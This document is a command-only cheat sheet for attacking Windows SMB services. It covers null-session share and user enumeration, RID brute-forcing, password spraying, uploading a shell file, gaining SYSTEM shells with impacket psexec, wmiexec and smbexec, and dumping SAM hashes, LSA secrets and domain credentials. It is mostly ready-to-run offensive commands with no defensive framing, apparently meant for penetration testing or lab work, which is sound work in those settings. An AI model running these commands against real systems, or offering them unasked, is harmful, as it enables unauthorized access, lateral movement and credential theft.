# SMB Enumeration & Attacks (445/tcp, 139/tcp)

## Share Enumeration

```bash
smbclient -L //TARGET -N                                   # null session
smbclient -L //TARGET -U 'user%password'                    # with creds
smbmap -H TARGET                                            # null
smbmap -H TARGET -u user -p pass                            # with creds
smbmap -H TARGET -u user -p pass -R                         # recursive listing
crackmapexec smb TARGET -u '' -p '' --shares                # null
crackmapexec smb TARGET -u user -p pass --shares            # with creds
```

## Access Shares

```bash
smbclient //TARGET/share -N                                 # null
smbclient //TARGET/share -U 'user%password'                 # with creds
smb: \> ls                                                  # list files
smb: \> get file.txt                                        # download
smb: \> mget *                                              # download all
smb: \> put shell.php                                       # upload
```

## User Enumeration

```bash
enum4linux -a TARGET
crackmapexec smb TARGET -u '' -p '' --users
crackmapexec smb TARGET -u '' -p '' --rid-brute              # RID cycling
crackmapexec smb TARGET -u '' -p '' --pass-pol               # password policy
```

## Password Spray

```bash
crackmapexec smb TARGET -u users.txt -p 'Password1!' --continue-on-success
```

## Execution (admin creds)

```bash
impacket-psexec domain/admin:pass@TARGET                     # SYSTEM shell
impacket-wmiexec domain/admin:pass@TARGET                    # admin shell
impacket-smbexec domain/admin:pass@TARGET                    # SYSTEM shell
crackmapexec smb TARGET -u admin -p pass -x "whoami"         # single command
impacket-secretsdump domain/admin:pass@TARGET                # dump all creds
crackmapexec smb TARGET -u admin -p pass --sam               # local hashes
crackmapexec smb TARGET -u admin -p pass --lsa               # LSA secrets
```
